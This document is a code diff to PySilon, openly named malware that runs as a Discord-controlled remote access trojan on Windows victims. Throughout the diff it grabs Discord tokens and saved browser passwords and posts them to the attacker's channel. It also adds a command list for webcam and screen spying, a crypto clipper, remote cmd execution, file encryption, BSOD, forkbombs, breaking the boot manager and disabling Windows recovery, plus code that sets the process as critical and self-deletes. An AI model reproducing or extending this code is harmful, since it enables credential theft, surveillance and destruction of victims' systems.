@@ -30,8 +30,8 @@ def log(entry): # [pysilon_mark] !debug
 
 # [pysilon_var] $modules 0
 from resources.protections import protection_check, fake_mutex_code # [pysilon_mark] !anti-vm
-from resources.discord_token_grabber import *
-from resources.passwords_grabber import *
+from resources.discord_token_grabber import * # [pysilon_mark] !grabber
+from resources.passwords_grabber import * # [pysilon_mark] !grabber
 from urllib.request import urlopen
 from resources.uac_bypass import *
 from itertools import islice
@@ -115,7 +115,7 @@ messages_to_send, files_to_send, embeds_to_send = [], [], []
 processes_messages, processes_list, process_to_kill = [], [], ''
 files_to_merge, expectation, one_file_attachment_message = [[], [], []], None, None
 cookies_thread, implode_confirmation, cmd_messages = None, None, []
-send_recordings, input_blocked, clipper_stop = True, False, True
+send_recordings, input_blocked, clipper_stop, turned_off, custom_message_to_send = True, False, True, False, [None, None, None]
 latest_messages_in_recordings = []
 # [pysilon_var] !registry 0
 
@@ -203,18 +203,15 @@ async def on_ready():
         await client.get_channel(channel_ids['info']).send('```' + chunk + '```')
         #.log Sent system information on info channel
 
-        accounts = grab_discord.initialize(False)
-        #.log Grabbed Discord (Auto)
-        for account in accounts:
-            reaction_msg = await client.get_channel(channel_ids['info']).send(embed=account); await reaction_msg.add_reaction('📌')
-            #.log Sent embed with Discord account data (Auto)
+        accounts = grab_discord.initialize(False) # [pysilon_mark] !grabber
+        for account in accounts: # [pysilon_mark] !grabber
+            reaction_msg = await client.get_channel(channel_ids['info']).send(embed=account); await reaction_msg.add_reaction('📌') # [pysilon_mark] !grabber
 
-        result = grab_passwords()
-        #.log Grabbed passwords (Auto)
-        embed=discord.Embed(title='Grabbed saved passwords', color=0x0084ff)
-        for url in result.keys():
-            embed.add_field(name='🔗 ' + url, value='👤 ' + result[url][0] + '\n🔑 ' + result[url][1], inline=False)
-        reaction_msg = await client.get_channel(channel_ids['info']).send(embed=embed); await reaction_msg.add_reaction('📌')
+        result = grab_passwords() # [pysilon_mark] !grabber
+        embed=discord.Embed(title='Grabbed saved passwords', color=0x0084ff) # [pysilon_mark] !grabber
+        for url in result.keys(): # [pysilon_mark] !grabber
+            embed.add_field(name='🔗 ' + url, value='👤 ' + result[url][0] + '\n🔑 ' + result[url][1], inline=False) # [pysilon_mark] !grabber
+        reaction_msg = await client.get_channel(channel_ids['info']).send(embed=embed); await reaction_msg.add_reaction('📌') # [pysilon_mark] !grabber
 
     else:
         #.log Fetching channel IDs...
@@ -242,6 +239,7 @@ async def on_ready():
     #.log Sent new session info message on main channel
 
 # [pysilon_var] !recording_startup 1
+# [pysilon_var] !process_blacklister 1
     
     while True:
         global send_recordings
@@ -283,7 +281,10 @@ async def on_ready():
             #.log New embed to send
             for embedd in embeds_to_send:
                 #.log Trying to send an embed
-                await client.get_channel(embedd[0]).send(embed=discord.Embed(title=embedd[1], color=0x0084ff).set_image(url='attachment://' + embedd[2]), file=discord.File(embedd[2]))
+                if len(embedd) == 3:
+                    await client.get_channel(embedd[0]).send(embed=discord.Embed(title=embedd[1], color=0x0084ff).set_image(url='attachment://' + embedd[2]), file=discord.File(embedd[2]))
+                else:
+                    await client.get_channel(embedd[0]).send(embed=embedd[1])
                 #.log Sent an embed
                 await asyncio.sleep(0.1)
             embeds_to_send = []
@@ -318,7 +319,7 @@ async def on_raw_reaction_add(payload):
 
 @client.event
 async def on_reaction_add(reaction, user):
-    global tree_messages, messages_from_sending_big_file, expectation, files_to_merge, processes_messages, process_to_kill, expectation, cmd_messages
+    global tree_messages, messages_from_sending_big_file, expectation, files_to_merge, processes_messages, process_to_kill, expectation, cmd_messages, custom_message_to_send
     #.log New reaction added (to message from current BOT session)
     if user.bot == False:
         #.log Reacting user is not a BOT
@@ -340,8 +341,12 @@ async def on_reaction_add(reaction, user):
                     except:
                         #.log Couldn\'t remove recordings directory. Ignoring the error
                         pass
+                    ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0)
+                    #.log Unset critical process
                     with open(f'C:\\Users\\{getuser()}\\implode.bat', 'w', encoding='utf-8') as imploder:
-                        imploder.write(f'pushd "C:\\Users\\{getuser()}"\ntaskkill /f /im "{software_executable_name}"\ntimeout /t 3 /nobreak\nrmdir /s /q "C:\\Users\\{getuser()}\\{software_directory_name}"\ndel "%~f0"')
+                        if IsAdmin(): attrib_value = f'attrib -s -h "C:\\Users\\{getuser()}\\{software_directory_name}"'
+                        else: attrib_value = f'attrib -h "C:\\Users\\{getuser()}\\{software_directory_name}"'
+                        imploder.write(f'pushd "C:\\Users\\{getuser()}"\n{attrib_value}\ntaskkill /f /im "{software_executable_name}"\ntimeout /t 3 /nobreak\nrmdir /s /q "C:\\Users\\{getuser()}\\{software_directory_name}"\ndel "%~f0"')
                     #.log Saved implode.bat
                     subprocess.Popen(f'C:\\Users\\{getuser()}\\implode.bat', creationflags=subprocess.CREATE_NO_WINDOW)
                     #.log Executed implode.bat. Killing PySilon...
@@ -370,9 +375,59 @@ async def on_raw_reaction_remove(payload):
         await message.unpin()
         #.log Unpinned reacted message
 
+help = {
+    'commands': {
+        'ss': ['➡️ `.ss`', 'Takes a screenshot of the victim\'s PC'],
+        'screenrec': ['➡️ `.screenrec`', 'Records the screen of the victim\'s PC for 15 seconds'],
+        'join': ['➡️ `.join`', 'Makes the BOT join a voice channel and live-stream microphone input'],
+        'show': ['➡️ `.show <what-to-show>`', 'Displays information about specified subject. Options:\n🔹processes - displays all running processes'],
+        'kill': ['➡️ `.kill <process-name>`', 'Kills a specified process. Options:\n🔹process-name - kills a specific process based on .show generated process-names'],
+        'block-input': ['➡️ `.block-input`', 'Blocks keyboard and mouse inputs of the victim\'s PC'],
+        'unblock-input': ['➡️ `.unblock-input`', 'Unblocks keyboard and mouse inputs of the victim\'s PC'],
+        'start-clipper': ['➡️ `.start-clipper`', 'Starts the Crypto Clipper thread on the victim\'s PC'],
+        'stop-clipper': ['➡️ `.stop-clipper`', 'Stops the Crypto Clipper thread on the victim\'s PC'],
+        'set-critical': ['➡️ `.set-critical`', 'Elevates the process to critical status.'],
+        'unset-critical': ['➡️ `.unset-critical`', 'Removes the critical status from the process.'],
+        'grab': ['➡️ `.grab <what-to-grab>`', 'Grabs specified information. Options:\n🔹passwords - grabs all browser-saved passwords\n🔹history - grabs the browser history\n🔹cookies - grabs browser-cookies\n🔹wifi - grabs all WiFi saved passwords\n🔹discord - grabs all possible information from victim\'s Discord account\n🔹all - grabs discord information, passwords & cookies'],
+        'clear': ['➡️ `.clear`', 'Clears all messages on the file-related channel'],
+        'pwd': ['➡️ `.pwd`', 'Displays current directory path'],
+        'ls': ['➡️ `.ls`', 'Lists current directory content'],
+        'cd': ['➡️ `.cd <directory>`', 'Changes working directory. Options:\n🔹directory - the destination directory (.. is the previous directory)'],
+        'tree': ['➡️ `.tree`', 'Displays the current directory\'s structure'],
+        'download': ['➡️ `.download <file-or-directory-name>`', 'Downloads specified file or folder. Options:\n🔹file-or-directory-name - name of file or directory that you want to download'],
+        'upload': ['➡️ `.upload <type> <name>`', 'Uploads a file to victim\'s PC. Options:\n🔹type - single/multiple files whether it\'s smaller or larger than 25MB (single=smaller, multiple=larger)\n🔹name - name of uploaded file on victim\'s PC'],
+        'execute': ['➡️ `.execute <file-name>`', 'Execute specified file on the victim\'s PC'],
+        'remove': ['➡️ `.remove <file-or-directory-name>`', 'Removes the specified file or directory. Options:\n🔹file-or-directory-name - name of file or directory that you want to remove'],
+        'key': ['➡️ `.key <what-to-type>`', 'Simulates typing on the victim\'s PC. Options:\n🔹ALTF4 - performs the Alt+F4 shortcut\n🔹ALTTAB - performs the Alt+Tab shortcut'],
+    },
+    'commands2': {
+        'blacklist': ['➡️ `.blacklist <process-name>`', 'Adds the specified process to the blacklist.'],
+        'whitelist': ['➡️ `.whitelist <process-name>`', 'Removes the specified process from the blacklist.'],
+        'turnoff': ['➡️ `.turnoff`', 'Turns all monitors off'],
+        'turnon': ['➡️ `.turnon`', 'Turns all monitors on'],
+        'block-website': ['➡️ `.block-website <url>`', 'Blocks the specified website from being accessed from any browser.'],
+        'unblock-website': ['➡️ `.unblock-website <url>`', 'Unblocks access to a previously blocked website.'],
+        'webcam': ['➡️ `.webcam photo`', 'Takes a photo of a victim\'s webcam (if one is detected)'],
+        'forkbomb': ['➡️ `.forkbomb`', 'Creates a self-replicating process until the victim\'s PC crashes.'],
+        'volume': ['➡️ `.volume`', 'Change the speaker volume on the victim\'s PC.'],
+        'play': ['➡️ `.play`', 'Play any .mp3 file on the victim\'s PC.'],
+        'tts': ['➡️ `.tts <message>`', 'Plays a Text-to-Speech voice message.'],
+        'msg': ['➡️ `.msg <parameters>`', 'Displays a custom message box to the victim\'s PC. Parameters:\n🔹text="" - The main text of the msg box\n🔹title="" - The title of the msg box\n🔹style="" - The msg box style (1, 2, 3, 4, 5, 6)'],
+        'cmd': ['➡️ `.cmd <command>`', 'Executes specified Command Prompt command on the victim\'s PC and sends back the output. Options:\n🔹command - a CMD command that will be executed on victim\'s PC'],
+        'bsod': ['➡️ `.bsod`', 'Triggers a Blue Screen of Death on the victim\'s PC.'],
+        'jumpscare': ['➡️ `.jumpscare`', 'Plays a very loud & rapidly flashing video.'],
+        'break-windows': ['➡️ `.break-windows`', 'Destroys Windows by renaming the boot manager. (Dangerous)'],
+        'disable-reset': ['➡️ `.disable-reset`', 'Disables windows recovery (ReAgentC)'],
+        'enable-reset': ['➡️ `.enable-reset`', 'Enables windows recovery (ReAgentC)'],
+        'encrypt': ['➡️ `.encrypt <directory>`', 'Encrypts every file in the specified directory'],
+        'decrypt': ['➡️ `.decrypt <directory>`', 'Decrypts every file in the specified directory'],
+        'implode': ['➡️ `.implode`', 'Entirely wipes the malware off of the victim\'s PC (to remove traces).']
+    }
+}
+
 @client.event
 async def on_message(message):
-    global channel_ids, vc, working_directory, tree_messages, messages_from_sending_big_file, files_to_merge, expectation, one_file_attachment_message, processes_messages, processes_list, process_to_kill, cookies_thread, implode_confirmation, cmd_messages, keyboard_listener, mouse_listener, clipper_stop, input_blocked
+    global channel_ids, vc, working_directory, tree_messages, messages_from_sending_big_file, files_to_merge, expectation, one_file_attachment_message, processes_messages, processes_list, process_to_kill, cookies_thread, implode_confirmation, cmd_messages, keyboard_listener, mouse_listener, clipper_stop, input_blocked, custom_message_to_send, turned_off
     #.log New message logged
     if message.author != client.user:
         if message.content == f'<@{client.user.id}>':
@@ -401,13 +456,85 @@ async def on_message(message):
                 sys.exit(0)
                 
             elif message.content[:5] == '.help':
-                #.log Message is "help"
+                
                 await message.delete()
-                #.log Removed the message
+                
                 if message.content.strip() == '.help':
                     #.log Author wants general help
-                    reaction_msg = await message.channel.send('```List of all commands:\n.ss\n.join\n.show [what-to-show]\n.kill [process-id]\n.grab [what-to-grab]\n.clear\n.pwd\n.tree\n.ls\n.download [file-or-dir]\n.upload [anonfiles-link]\n.execute [file]\n.remove [file-or-dir]\n.implode\n.webcam photo\n.screenrec\n.block-input\n.unblock-input\n.start-clipper\n.stop-clipper\n.bsod\n.cmd [command]\n.cd [dir]\nDetailed List here: https://github.com/mategol/PySilon-malware/wiki/Commands```'); await reaction_msg.add_reaction('🔴')
+                    embed = discord.Embed(title='List of all available commands', color=0x49fc03)
+                    for i in help['commands'].keys():
+                        embed.add_field(name=help['commands'][i][0], value=help['commands'][i][1], inline=False)
+                    await message.channel.send(embed=embed)
+                    embed = discord.Embed(color=0x49fc03)
+                    for i in help['commands2'].keys():
+                        embed.add_field(name=help['commands2'][i][0], value=help['commands2'][i][1], inline=False)
+                    await message.channel.send(embed=embed)
                     #.log Sent message with PySilon commands manual
+                
+            elif message.content == '.set-critical':
+                #.log Message is set-critical
+                await message.delete()
+                #.log Removed the message
+                try:
+                    ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
+                    ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0
+                    #.log Set PySilon as a critical process
+                    embed = discord.Embed(title="🟣 System",description=f'```Process elevated to critical status successfully.\nWarning: This critical process can cause of BSOD when the victim tries to shut down their system.```', colour=discord.Colour.purple())
+                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
+                    #.log Sent success message
+                except: 
+                    await message.channel.send('`Something went wrong while elevating the process`')
+                    #.log Something went wrong when setting critical process
+
+            elif message.content == '.unset-critical':
+                #.log Message is unset-critical
+                await message.delete()
+                #.log Removed the message
+                try:
+                    ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0)
+                    #.log Removed PySilon from critical processes
+                    embed = discord.Embed(title="🟣 System",description=f'```Successfully removed critical status from process.```', colour=discord.Colour.purple())
+                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
+                    #.log Sent success message
+                except: 
+                    await message.channel.send('`Something went wrong while removing critical status`')
+                    #.log Something went wrong when unsetting critical process
+
+            elif message.content == '.disable-reset':
+                #.log Message is disable-reset
+                await message.delete()
+                #.log Removed the message
+                if IsAdmin():
+                    subprocess.run('reagentc.exe /disable', creationflags=subprocess.CREATE_NO_WINDOW)
+                    #.log Disabled ReAgentC
+                    embed = discord.Embed(title="🟣 System",description=f'```Successfully disabled REAgentC.```', colour=discord.Colour.purple())
+                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
+                    #.log Sent success message
+                else:
+                    embed = discord.Embed(title="📛 Error",description=f'```Disabling REAgentC requires elevation.```', colour=discord.Colour.purple())
+                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
+                    #.log Sent error message for missing permissions
+
+            elif message.content == '.enable-reset':
+                #.log Message is disable-reset
+                await message.delete()
+                #.log Removed the message
+                if IsAdmin():
+                    subprocess.run('reagentc.exe /enable', creationflags=subprocess.CREATE_NO_WINDOW)
+                    #.log Disabled ReAgentC
+                    embed = discord.Embed(title="🟣 System",description=f'```Successfully enabled REAgentC.```', colour=discord.Colour.purple())
+                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
+                    #.log Sent success message
+                else:
+                    embed = discord.Embed(title="📛 Error",description=f'```Enabling REAgentC requires elevation.```', colour=discord.Colour.purple())
+                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
+                    #.log Sent error message for missing permissions
 
             elif expectation == 'key':
                 #.log Message is PySilon.key candidate
